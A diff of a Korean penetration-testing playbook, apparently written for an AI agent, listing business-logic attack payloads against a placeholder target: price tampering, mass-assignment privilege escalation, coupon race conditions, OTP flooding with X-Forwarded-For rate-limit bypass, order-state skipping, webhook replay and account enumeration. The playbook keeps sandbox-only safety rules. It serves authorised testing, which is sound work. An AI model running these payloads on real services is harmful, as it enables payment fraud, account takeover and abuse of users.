@@ -1,19 +1,10 @@
-**계정 요구사항:** 최소 2개 — 계정 A (리소스 소유자), 계정 B (비소유자/외부 공격자).
+### 기본 페이로드
 
-#### [필수] 쓰기 작업 안전 수칙
-- sandbox 도메인 한정 (prod/cbt/staging 절대 금지)
-- 파괴적 행위 금지 (탈퇴, 비밀번호 변경, 이메일 변경, 실제 결제, 영구 삭제)
-- 테스트 데이터 직접 생성 (기존 데이터 변경 금지)
-- 결제 테스트는 PG 모킹/dry-run 확인 후만 — 미확인 시 "후보 (환경 제한)"
-- 테스트 후 정리 (생성 리소스 ID 기록, role 원복)
+테스트 전 계정 2개 준비 — 계정 A (리소스 소유자), 계정 B (비소유자/외부 공격자).
 
----
+#### `PRICE_TAMPER` — 가격/수량 조작
 
-## 라벨별 테스트 절차
-
-### `PRICE_TAMPER` — 가격/수량 조작
-
-#### 기본 페이로드 (request body 변조)
+request body 변조:
 ```json
 {"productId":"<id>","quantity":1,"price":-10000}        # 음수 금액
 {"productId":"<id>","quantity":0,"price":1}             # 0 수량
@@ -24,13 +15,8 @@
 {"productId":"<id>","quantity":1,"price":"1.0e-10"}     # 과학표기/floating point 오차
 ```
 
-### 우회 페이로드
-- `currency: "KRW"` → `currency: "VND"` (환율 조작)
-- 결제 콜백 가로채기 + amount 변조 (PG webhook signature 미검증)
+#### `PRIV_ESCALATION` — 권한 상승 (mass assignment)
 
-### `PRIV_ESCALATION` — 권한 상승 (mass assignment)
-
-### 기본 페이로드
 ```json
 PATCH /api/users/me  Cookie: session=USER
 {"nickname":"x","role":"admin","isAdmin":true,"permissions":["ADMIN"],"is_superuser":true,"groups":["administrators"]}
@@ -44,11 +30,11 @@ curl -s "https://target/api/users/me" -H "Cookie: session=USER"
 curl -si "https://target/api/admin/users" -H "Cookie: session=USER"
 ```
 
-**테스트 종료 후 role 원복 필수.**
+테스트 종료 후 role 원복 필수.
 
-### `RACE_CONDITION` — 레이스 / TOCTOU
+#### `RACE_CONDITION` — 레이스 / TOCTOU
 
-#### 기본 페이로드 (단일 Bash + 백그라운드 — 지침 5 예외)
+단일 Bash + 백그라운드 (지침 5 예외):
 ```bash
 URL="https://target/api/coupons/apply"
 SESSION="<계정A 세션>"
@@ -74,9 +60,8 @@ curl -s "https://target/api/users/me/coupons" -H "Cookie: SESSION=$SESSION"
 
 대상: 쿠폰 1회 사용, 잔액 차감, 재고 감소, 투표/좋아요 1인 1회.
 
-### `FEATURE_ABUSE` — Rate Limit 우회 / 기능 남용
+#### `FEATURE_ABUSE` — Rate Limit 우회 / 기능 남용
 
-### 기본 페이로드
 ```bash
 # 50회 연속 OTP 발송
 for i in $(seq 1 50); do
@@ -87,16 +72,10 @@ for i in $(seq 1 50); do
 done
 ```
 
-#### 우회
-- `X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))` (IP rate limit 우회)
-- 재로그인 후 카운터 초기화 확인 (세션 기반)
-- 다중 sub-account/email로 분산
-
 대상: SMS/이메일/OTP 발송, 파일 업로드, 로그인 시도. **결제/회원 탈퇴/비밀번호 변경 제외.**
 
-### `STATE_BYPASS` — 상태 머신 우회
+#### `STATE_BYPASS` — 상태 머신 우회
 
-### 기본 페이로드
 ```bash
 # 1. 신규 주문 생성 (pending 상태)
 curl -X POST "https://target/api/orders" -H "Cookie: SESSION=A" \
@@ -114,9 +93,8 @@ curl -s "https://target/api/orders/<orderId>" -H "Cookie: SESSION=A"
 
 대상: 주문/결제/승인/신청 워크플로우.
 
-### `DATA_INTEGRITY` — 데이터 정합성
+#### `DATA_INTEGRITY` — 데이터 정합성
 
-### 기본 페이로드
 ```bash
 # 1. 자기 자신 대상 (자기 송금/팔로우/평가)
 curl -X POST "https://target/api/transfer" -H "Cookie: SESSION=A" \
@@ -137,9 +115,8 @@ curl -X POST "https://target/webhooks/payment" -H "X-Webhook-Signature: ..." \
   -d '<이전 webhook body>'
 ```
 
-### `INFO_DISCLOSURE` — 비즈니스 정보 노출
+#### `INFO_DISCLOSURE` — 비즈니스 정보 노출
 
-### 기본 페이로드
 ```bash
 # 1. 계정 존재 여부 diff (별도 check endpoint 우선)
 curl -s -X POST "https://target/api/auth/check-email" \
@@ -162,19 +139,19 @@ curl -s "https://target/api/users/me" -H "Cookie: SESSION=A" \
 
 | 라벨 | 우회 |
 |---|---|
-| PRICE_TAMPER | 결제 callback signature 미검증 시 amount 변조, 환율 조작 (`currency` 변경) |
-| PRIV_ESCALATION | 직접 PATCH 외 batch update API, GraphQL mutation, admin invite token 재사용 |
-| RACE | HTTP/2 multiplexing으로 단일 connection 다중 요청, gRPC stream 활용 |
-| FEATURE_ABUSE | IP/세션/계정 분산, captcha 우회 (2captcha 같은 외부 솔버) |
-| STATE_BYPASS | 단계별 trigger event를 임의 순서로, webhook 재전송 |
-| DATA_INTEGRITY | Idempotency-Key 재사용 (다른 payload + 같은 key) |
-| INFO_DISCLOSURE | login error message diff, signup error diff, password reset diff |
+| `PRICE_TAMPER` | 결제 callback signature 미검증 시 amount 변조, 환율 조작 (`currency: KRW` → `VND`) |
+| `PRIV_ESCALATION` | 직접 PATCH 외 batch update API, GraphQL mutation, admin invite token 재사용 |
+| `RACE_CONDITION` | HTTP/2 multiplexing으로 단일 connection 다중 요청, gRPC stream 활용 |
+| `FEATURE_ABUSE` | `X-Forwarded-For` 랜덤 IP, 다중 sub-account/email로 분산, captcha 우회 (2captcha 같은 외부 솔버), 재로그인 후 카운터 초기화 확인 (세션 기반) |
+| `STATE_BYPASS` | 단계별 trigger event를 임의 순서로, webhook 재전송 |
+| `DATA_INTEGRITY` | Idempotency-Key 재사용 (다른 payload + 같은 key) |
+| `INFO_DISCLOSURE` | login error message diff, signup error diff, password reset diff |
 
 ---
 
 ### 참고사항
 
-- 쓰기 작업 안전 수칙은 라벨별 테스트 전 반드시 확인 — sandbox 한정, 파괴적 행위 금지
+- 쓰기 작업 안전 수칙: sandbox 도메인 한정 (prod/cbt/staging 절대 금지), 파괴적 행위 금지 (탈퇴/비밀번호/이메일 변경, 실제 결제, 영구 삭제), 테스트 데이터 직접 생성, 결제는 PG 모킹/dry-run 확인 후만 (미확인 시 "후보 (환경 제한)"), 테스트 후 정리 (생성 리소스 ID 기록, role 원복)
 - 결제 테스트는 PG 모킹/dry-run 확인 없으면 "후보 (환경 제한)" 유지, 호출 금지
 - Race는 단일 Bash 호출 내부 `&`로만 병렬 (지침 5 예외)
 - FEATURE_ABUSE에서 IP rate limit만 있으면 `X-Forwarded-For` 랜덤으로 우회 시도
